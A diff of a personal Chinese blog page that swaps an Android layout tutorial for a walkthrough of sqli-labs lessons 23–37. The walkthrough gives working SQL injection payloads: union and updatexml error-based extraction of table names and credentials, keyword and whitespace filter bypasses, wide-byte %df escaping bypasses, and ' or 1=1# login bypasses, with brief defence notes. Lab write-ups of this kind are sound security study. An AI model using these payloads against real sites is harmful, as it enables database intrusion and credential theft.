@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="多个xml布局的共享与拼接, 比企谷八幡">
+    <meta name="keywords" content="less23-37, 比企谷八幡">
     <meta name="description" content="用我三生烟火,换你一世迷离。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>多个xml布局的共享与拼接 | 比企谷八幡</title>
+    <title>less23-37 | 比企谷八幡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">多个xml布局的共享与拼接</h1>
+                    <h1 class="description center-align post-title">less23-37</h1>
                 </div>
             </div>
         </div>
@@ -431,31 +431,18 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">
-                                <span class="chip bg-color">安卓开发</span>
+                            <a href="/tags/sqli-labs/">
+                                <span class="chip bg-color">sqli-labs</span>
                             </a>
                         
-                            <a href="/tags/%E6%98%9F%E6%A2%A6%E7%BC%98/">
-                                <span class="chip bg-color">星梦缘</span>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/" class="post-category">
-                                安卓开发
-                            </a>
-                        
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/" class="post-category">
-                                项目实战
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -464,28 +451,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-27
+                    2020-11-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-28
+                    2020-12-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    296
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 
@@ -495,17 +482,125 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一-在一个xml文件中添加另一个xml文件布局"><a href="#一-在一个xml文件中添加另一个xml文件布局" class="headerlink" title="一.在一个xml文件中添加另一个xml文件布局"></a>一.在一个xml文件中添加另一个xml文件布局</h2><p>当有多个页面有相同部分时,可以先写一个共有部分的xml文件(比如标题头部),然后在另一个xml文件中写</p>
-<pre><code>    &lt;include layout="@layout/xxxx"/&gt;</code></pre><h2 id="在java中实现对多个xml中布局组件的合并"><a href="#在java中实现对多个xml中布局组件的合并" class="headerlink" title="在java中实现对多个xml中布局组件的合并"></a>在java中实现对多个xml中布局组件的合并</h2><p><img src="https://i.loli.net/2020/07/28/zDPJwdYXf2to5MI.png" alt=""><br>使用LayoutInflater可以实现布局组件的的合并<br>实战案例：(星梦缘star部分二级页面的编写)<br><img src="https://i.loli.net/2020/07/28/E2Z6AkxzvVIpWSe.png" alt="最终效果图1"><br><img src="https://i.loli.net/2020/07/28/WbB5MtoVGO7fIYm.png" alt="最终效果图2"></p>
-<p><img src="https://i.loli.net/2020/07/28/M3rbzJWSPwIGLyN.png" alt="activity_star_analysis.xml"><br><img src="https://i.loli.net/2020/07/28/Ju3qg9X7vpSkDtl.png" alt="footer_star_analysis.xml"><br>分开写了这两个模块之后,想要在ListView下面加上星座解析,在java代码中要这样写 ：   </p>
-<pre class=" language-java"><code class="language-java">        ListView analysisLv<span class="token punctuation">;</span>
-        <span class="token keyword">private</span> TextView footerTv<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ListView底部需要改变的文字</span>
-          <span class="token comment" spellcheck="true">//为ListView添加底部布局</span>
+                <h2 id="一-less23"><a href="#一-less23" class="headerlink" title="一.less23"></a>一.less23</h2><p>本关不能用–+来进行输出,源码中自动换成空格了<br><a href="https://imgchr.com/i/DGtYi4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGtYi4.png" alt=""></a></p>
+<p>通过单引号测试获得的报错信息得知是单引号闭合<br>猜测原sql语句</p>
+<pre><code>select id,username,password from users where id='xx'</code></pre><p>方法一:特殊字符,作用是截断(相当于注释)</p>
+<pre><code>;%00
+http://127.0.0.1/sqli-labs/Less-23/?id=-1'union select 1,2,database();%00</code></pre><p>方法二(这个闭合构造的是真的强):</p>
+<pre><code>#利用原生的有单引号构造闭合'2'
+http://127.0.0.1/sqli-labs/Less-23/?id=-1'union select 1,database(),'2</code></pre><p>利用方法2的思路联合注入或者报错注入之类的都行,就不赘述了</p>
+<h2 id="二-less24"><a href="#二-less24" class="headerlink" title="二.less24"></a>二.less24</h2><p>这关的手法直接看下图即可<br>警示:要防止账号里有非法字符<br><a href="https://imgchr.com/i/DGDyRS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGDyRS.png" alt=""></a><br><a href="https://imgchr.com/i/DGDBIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/22/DGDBIP.png" alt=""></a></p>
+<h2 id="三-less25和less25a"><a href="#三-less25和less25a" class="headerlink" title="三.less25和less25a"></a>三.less25和less25a</h2><h3 id="less25"><a href="#less25" class="headerlink" title="less25"></a>less25</h3><p>本关主要的考点在于 or和and 过滤(考点在这里所以就不用别的方法了)，如何绕过 or 和 and 过滤。一般性提供以下几种思路：</p>
+<ul>
+<li><p>（1）    大小写变形 Or,OR,oR</p>
+</li>
+<li><p>（2）    编码，hex，urlencode</p>
+</li>
+<li><p>（3）    添加注释/<em>or</em>/</p>
+</li>
+<li><p>（4）    利用符号 and=&amp;&amp;    or=||</p>
+</li>
+</ul>
+<p>比如利用 || 绕过or的过滤然后进行注入,由于本关存在输出报错，所以可以用报错注入</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-25/?id=1' || updatexml(1,concat(0x7e,version()),1)--+    </code></pre><h3 id="less25a"><a href="#less25a" class="headerlink" title="less25a"></a>less25a</h3><p>本关不存在报错,所以报错注入不能用了,不过可以考虑联合注入或者延时注入<br><strong><em>联合注入</em></strong></p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-25a/?id=1 union select 1,2,3#</code></pre><p>延时注入</p>
+<h2 id="四-less26和less26a"><a href="#四-less26和less26a" class="headerlink" title="四.less26和less26a"></a>四.less26和less26a</h2><p><strong><em>注:从本关开始,阿帕奇存在空格无法转义的问题(在ubantu上是可以的)</em></strong></p>
+<p>本关结合25关，将空格，or，and,/*,#,–,/等各种符号过滤，此处对于and，or的处理方法不再赘述，参考25.此处我们需要说明两方面：对于注释和结尾字符的我们此处只能利用构造一个’来闭合后面到’；对于空格，有较多的方法：</p>
+<ul>
+<li>%09 TAB键（水平）</li>
+<li>%0a 新建一行%0c新的一页</li>
+<li>%0d return功能</li>
+<li>%0b TAB键（垂直）</li>
+<li>%a0空格(window无法解析 )</li>
+</ul>
+<p>由于在windows下阿帕奇的服务器上不能使用%a0解析空格,所以下面的代码都用括号+报错注入来举例(如果能解析空格的话就和之前完全一样了)</p>
+<ul>
+<li><p>报错注入获取数据库名:</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(1,concat(0x7e,database(),1),1)||'1'='1</code></pre></li>
+<li><p>报错注入获取security下的表名:</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(0x7e,(select(group_concat(table_name))from (infoorrmation_schema.tables)where (table_schema='security')),1)||'1'='1</code></pre></li>
+<li><p><strong>注:由于本关会对sql语句中的or进行一次过滤,所以在information那里要写成infoorrmation*</strong></p>
+</li>
+</ul>
+<p><a href="https://imgchr.com/i/DJ71Sg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJ71Sg.png" alt=""></a></p>
+<ul>
+<li><p>报错注入获取users中的列名:</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(0x7e,(select(group_concat(column_name))from (infoorrmation_schema.columns)where (table_name="emails")),1)||1='1</code></pre><p><a href="https://imgchr.com/i/DJqzcD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJqzcD.png" alt=""></a></p>
+</li>
+<li><p>获取username和password</p>
+</li>
+</ul>
+<p>因为一次性取会存在数据取补全的情况,所以可以选择靠id一个个取(注意where不能加括号)</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-26/?id=1'||updatexml(1,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from (users)where(id=1)),1)||1='1</code></pre><p><strong><em>这里我不知道为什么我的电脑里会出现第一个数据不能完整显示的问题,sql可以正常运行</em></strong><br><a href="https://imgchr.com/i/DJxt0g" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/23/DJxt0g.png" alt=""></a></p>
+<h2 id="五-less27和less27a"><a href="#五-less27和less27a" class="headerlink" title="五.less27和less27a"></a>五.less27和less27a</h2><h3 id="less27"><a href="#less27" class="headerlink" title="less27"></a>less27</h3><p>本关主要考察将union，select和26关过滤掉的字符。此处我们依旧和26关的方式是一样的，只需要将union和select改为大小写混合就可以突破,具体略</p>
+<h3 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h3><p>本题不存在报错输出,所以不能用报错注入,这关id使用双引号闭合,其他的同less27,可以用联合注入和%a0来进行注入</p>
+<h2 id="五-less28和less28a"><a href="#五-less28和less28a" class="headerlink" title="五.less28和less28a"></a>五.less28和less28a</h2><h3 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h3><p>本题和27关几乎没有区别,就id那里用了单引号闭合,直接联合或者报错注入即可</p>
+<h3 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h3><p>本关与 28 基本一致,但是是单引号+单括号闭合，只是过滤条件少了几个。</p>
+<h2 id="六-总结-less23-28"><a href="#六-总结-less23-28" class="headerlink" title="六.总结(less23-28)"></a>六.总结(less23-28)</h2><p>这几关都是在处理特殊符号被过滤时的问题</p>
+<p>遇到字符过滤的情况有如下方法:</p>
+<ul>
+<li>1.特殊字符过滤</li>
+<li>2.用括号把不同块包起来构造合法sql语句</li>
+<li>3.对于过滤字母单词的,可以把字母小写改成大写,或者用重复的方式试试比如;or被replace进行过滤且进行一次,就可以用 oorr 来构造</li>
+</ul>
+<hr>
+<h2 id="七-less29"><a href="#七-less29" class="headerlink" title="七.less29"></a>七.less29</h2><p><strong><em>本关开始到31是基于服务器的两层架构,phpstudy不支持,所以只讲基本思路不做演示(基本和前面一样)</em></strong></p>
+<p>两个服务器里,apache是真正要用到了,然后tomcat起到的是过滤作用<br>。比如下面代码的网址中<strong><em>第一个id=1是给tomcat的,是不起作用的,第二个id才起作用(就这一个知识点)其他的注入方式同之前</em></strong></p>
+<pre><code>http://127.0.0.1:8080/sqli-labs/Less-29/index.jsp?id=1&amp;id=-2'union select 1,user(),3--+</code></pre><h2 id="八-less30"><a href="#八-less30" class="headerlink" title="八.less30"></a>八.less30</h2><p>这里第二个id是双引号闭合,其他一样</p>
+<h2 id="九-less31"><a href="#九-less31" class="headerlink" title="九.less31"></a>九.less31</h2><p>这里第二个id是双引号+单括号闭合</p>
+<h2 id="十-总结-less29-31"><a href="#十-总结-less29-31" class="headerlink" title="十.总结(less29-31)"></a>十.总结(less29-31)</h2><p>(暂时略)</p>
+<hr>
+<p><strong><em>less-32,33,34,35,36,37 六关全部是针对’和\的过滤,下面会讲到宽字节注入的手法</em></strong><br><a href="https://imgchr.com/i/DUEIaR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUEIaR.png" alt=""></a></p>
+<h2 id="十一-less32"><a href="#十一-less32" class="headerlink" title="十一. less32"></a>十一. less32</h2><p>通过输出的sql语句可以看出,我们手动添加的单引号被过滤掉了(源码中使用replace过滤的)<br><a href="https://imgchr.com/i/DUE9vF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUE9vF.png" alt=""></a></p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-32/?id=-1 %df'union select 1,2,database() --+
+</code></pre><p>说明:从gbk编码的原理可知,汉字是占两个字节的,然后由上面可知urlencode(')    = %5c%27,前面补一个%df的,就能把\吃掉,%27则作为一个单独的符号在外面</p>
+<p>上面的代码思路就是如此,加一个%df后就和普通的注入一样了<br>(这里应该是因为编码的原因下图中输出的sql语句中手动添加的单引号乱码)</p>
+<p><a href="https://imgchr.com/i/DUVx6U" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUVx6U.png" alt="结果图"></a></p>
+<h2 id="十二-less33"><a href="#十二-less33" class="headerlink" title="十二.less33"></a>十二.less33</h2><p>本关过滤使用函数 addslashes(),用于在预定义字符之前添加反斜杠的字符串(预定义字符: ‘，”，\ )<br>本关依旧可以用%df绕过,代码同less32</p>
+<p><strong><em>防御漏洞的方法 :使用addslashes(),我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</em></strong></p>
+<h2 id="十三-less34"><a href="#十三-less34" class="headerlink" title="十三.less34"></a>十三.less34</h2><p>本关是post型的注入漏洞,由于单引号等特殊字符被过滤<br><a href="https://imgchr.com/i/DUZs3V" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/24/DUZs3V.png" alt=""></a></p>
+<p><strong><em>我们此处介绍一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为�’   (别漏了单引号)</em></strong></p>
+<p>按照下面的方式就可以登陆成功了,然后直接用报错注入就行了(我不是很懂用�’ 的时候输出的sql语句里明明在’前面有个转义字符,那这个单引号有什么用,为什么删除之后就不能正常运行,会报如下的错)</p>
+<pre><code>账号: �' or 1=1#
+密码随便输</code></pre><p><a href="https://imgchr.com/i/DUnwAH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/DUnwAH.png" alt=""></a></p>
+<pre><code>#这个报错我不太明白什么意思
+llegal mix of collations (utf8_general_ci,IMPLICIT) and (gbk_chinese_ci,COERCIBLE) for operation '='
+</code></pre><h2 id="十四-less35"><a href="#十四-less35" class="headerlink" title="十四.less35"></a>十四.less35</h2><p>这关按照天书的说法,和第二关一毛一样,我感觉可能有哪里有漏  </p>
+<pre><code># 整型注入
+http://127.0.0.1/sqli-labs/Less-35/?id=-1 union select 1,2,database()#</code></pre><h2 id="十五-less36"><a href="#十五-less36" class="headerlink" title="十五.less36"></a>十五.less36</h2><p>本关使用mysql_real_escape_string()函数来进行过滤的  </p>
+<p><strong><em>mysql_real_escape_string()的作用 : 基本和addslashes()相同转义SQL语句中使用的字符串中的特殊字符,如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</em></strong></p>
+<p>受影响的字符:  </p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<p>本关通关手段和之前一样,%df和utf-16的单引号形式两种方法都能绕过检测然后实施注入</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-36/?id=-1 %df'union select 1,user(),database()--+
 
-        View footerView <span class="token operator">=</span> LayoutInflater<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>layout<span class="token punctuation">.</span>footer_star_analysis<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将布局转化成View对象(也可以是组件)</span>
-        analysisLv<span class="token punctuation">.</span><span class="token function">addFooterView</span><span class="token punctuation">(</span>footerView<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置底部的位置添加(也可以设置头部)</span>
-        footerTv<span class="token operator">=</span>footerView<span class="token punctuation">.</span><span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>footerstar_tv_info<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><strong><em>其中analysisLv是ListView的对象,footerstar_tv_info是textview的id,对象我们一般声明在外面的全局区域</em></strong></p>
+http://127.0.0.1/sqli-labs/Less-36/?id=-1 �'union select 1,user(),database()--+</code></pre><p><a href="https://imgchr.com/i/DUKewF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/DUKewF.png" alt=""></a></p>
+<p><strong><em>防御漏洞的方法 :在使用mysql_real_escape_string()时,将mysql设置为gbk即可</em></strong></p>
+<p>设置代码：</p>
+<pre><code>Mysql_set_charset(‘gbk’,’$conn’</code></pre><h2 id="十六-less37"><a href="#十六-less37" class="headerlink" title="十六.less37"></a>十六.less37</h2><p>本关也是使用mysql_real_escape_string()函数来进行过滤的<br>其他的同less34,都是post的注入类型,由于和addslashes()原理相同,所以代码也相同</p>
+<pre><code>账号:admin�' or 1=1#
+密码随便输</code></pre><h2 id="十七-总结-less32-37"><a href="#十七-总结-less32-37" class="headerlink" title="十七.总结(less32-37)"></a>十七.总结(less32-37)</h2><p>1.上面给出了三种过滤的方式分别是 ：</p>
+<ul>
+<li>replace</li>
+<li>addslashes()</li>
+<li>mysql_real_escape_string()。</li>
+</ul>
+<p>其中第二第三种是差不多,都是通过转义字符来过滤。防御方式也已经在上面给出不再赘述.</p>
+<p>破解方法:</p>
+<ul>
+<li><p>对replace前面的关卡已经详细讲过了,这里不细说，总之就是各种替换,用大小写等各种手段。</p>
+</li>
+<li><p>第二三种过滤方式的破解手段就是看情况使用用%df和�’,其中post型的注入不能用前者</p>
+</li>
+</ul>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -549,7 +644,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://1766095699.github.io/2020/07/27/gong-xiang-xml-bu-ju/">https://1766095699.github.io/2020/07/27/gong-xiang-xml-bu-ju/</a>
+                    <a href="https://1766095699.github.io/2020/11/21/less23-37/">https://1766095699.github.io/2020/11/21/less23-37/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -587,12 +682,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">
-                                    <span class="chip bg-color">安卓开发</span>
+                                <a href="/tags/sqli-labs/">
+                                    <span class="chip bg-color">sqli-labs</span>
                                 </a>
                             
-                                <a href="/tags/%E6%98%9F%E6%A2%A6%E7%BC%98/">
-                                    <span class="chip bg-color">星梦缘</span>
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
                                 </a>
                             
                         </div>
@@ -637,7 +732,7 @@
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-07-27T16-53-58',
+        id: '2020-11-21T22-34-07',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -665,40 +760,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/07/28/listview/">
+                <a href="/2020/11/25/less38-53/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="ListView的用法+实战">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="less38-53">
                         
-                        <span class="card-title">ListView的用法+实战</span>
+                        <span class="card-title">less38-53</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            效果图属性值一列下来就是用ListView实现的  
-一.xml文件1.ListView布局在主xml &lt;ListView
-         android:id="@+id/staranalysis_lv"
-         and
+                            一.less38堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用。堆叠注入的危害巨大,less45将演示利用堆叠注入写一句话木马
+less38-45是关于堆叠注入的学习,通关要求是找到注入点进行堆叠
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-25
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/" class="post-category">
-                                    安卓开发
-                                </a>
-                            
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/" class="post-category">
-                                    项目实战
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            灿若星河
                             
                         </span>
                     </div>
@@ -706,12 +791,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">
-                        <span class="chip bg-color">安卓开发</span>
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
                     </a>
                     
-                    <a href="/tags/%E6%98%9F%E6%A2%A6%E7%BC%98/">
-                        <span class="chip bg-color">星梦缘</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
@@ -725,41 +810,32 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/27/guan-yu-wang-ge-tu-gridview-de-yong-fa/">
+                <a href="/2020/11/21/less11-22/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="网格图GridView的用法+实战">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="less11-22">
                         
-                        <span class="card-title">网格图GridView的用法+实战</span>
+                        <span class="card-title">less11-22</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            []  
-一.XML布局1.主xml写gridview其中numColumns用来控制列数      
-    &lt;GridView
-            android:id="@+id/starfrag_gv"
-         
+                            
+注1:从现在less11开始,进入post的世界了,前十关都是get请求,post请求在网址上看不见,要开Burpsuit等工具可以看到。下面为为了方便,都以F12中的抓包方式来查看表单一.less11
+
+1.通过查看表单中的信息可以知道
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-21
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/" class="post-category">
-                                    安卓开发
-                                </a>
-                            
-                            <a href="/categories/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/" class="post-category">
-                                    项目实战
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            灿若星河
                             
                         </span>
                     </div>
@@ -767,12 +843,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/">
-                        <span class="chip bg-color">安卓开发</span>
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
                     </a>
                     
-                    <a href="/tags/%E6%98%9F%E6%A2%A6%E7%BC%98/">
-                        <span class="chip bg-color">星梦缘</span>
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
                     </a>
                     
                 </div>
